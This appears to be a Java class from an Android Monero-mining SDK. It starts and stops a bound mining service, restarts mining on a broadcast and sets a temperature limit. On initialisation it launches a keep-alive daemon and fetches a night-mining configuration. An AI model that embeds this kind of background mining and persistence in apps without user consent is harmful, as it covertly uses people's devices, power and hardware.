package waterhole.miner.monero;

import android.app.Application;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import java.io.ObjectStreamException;

import waterhole.miner.core.AbstractMiner;
import waterhole.miner.core.config.NightConfiguration;
import waterhole.miner.core.keepAlive.DaemonEnv;
import waterhole.miner.core.utils.LogUtils;

import static waterhole.miner.core.utils.LogUtils.error;

public final class XmrMiner extends AbstractMiner {

    private IMiningServiceBinder mServiceBinder;
    private MineReceiver mineReceiver;

    private final ServiceConnection mServerConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
            try {
                LogUtils.debug("XmrMiner onServiceConnected");
                mServiceBinder = IMiningServiceBinder.MiningServiceBinder.asInterface(iBinder);
                mServiceBinder.startMine();
                mServiceBinder.setControllerNeedRun(true);
                if (topTemperature != -1)
                    mServiceBinder.setTemperature(topTemperature);
            } catch (Exception e) {
                error("XmrMiner|ServiceConnection: " + e.getMessage());
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName componentName) {
            mServiceBinder = null;
        }
    };

    public boolean isMining() {
        return mServiceBinder != null;
    }

    private XmrMiner() {
    }

    public static XmrMiner instance() {
        return Holder.instance;
    }

    private static class Holder {
        private static XmrMiner instance = new XmrMiner();
    }

    private Object readResolve() throws ObjectStreamException {
        return instance();
    }

    public static void initApplication(Application application) {
        if (application == null) {
            throw new IllegalArgumentException("application is null");
        }
        // 需要在 Application 的 onCreate() 中调用一次 DaemonEnv.initialize()
        DaemonEnv.initialize(application, TraceServiceImpl.class, DaemonEnv.DEFAULT_WAKE_UP_INTERVAL);
        TraceServiceImpl.sShouldStopService = false;
        DaemonEnv.startServiceMayBind(TraceServiceImpl.class);

        // 获取夜挖配置
        NightConfiguration.instance().fetchConfig(application);
    }

    @Override
    public void startMine() {
        LogUtils.debug("XmrMiner startMine");
        if (mineReceiver == null) {
            mineReceiver = new MineReceiver();
            IntentFilter intentFilter = new IntentFilter();
            intentFilter.addAction("waterhole.miner.monero.restart");
            getContext().registerReceiver(mineReceiver, intentFilter);
        }
        final Intent intent = new Intent(getContext(), MineService.class);
        getContext().bindService(intent, mServerConnection, Context.BIND_AUTO_CREATE);
    }

    @Override
    public void stopMine() {
        try {
            LogUtils.debug("XmrMiner stopMine");
            if (mServiceBinder != null) {
                getContext().unbindService(mServerConnection);
                getContext().unregisterReceiver(mineReceiver);
                mineReceiver = null;
                mServiceBinder = null;
            }
        } catch (Exception e) {
            error("XmrMiner|stopMine: " + e.getMessage());
        }
    }

    public class MineReceiver extends BroadcastReceiver {
        public MineReceiver() {
        }

        @Override
        public void onReceive(Context context, Intent intent) {
            LogUtils.debug("XmrMiner$MineReceiver onReceive");
            stopMine();
            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                @Override
                public void run() {
                    startMine();
                }
            }, 1000);
        }
    }
}
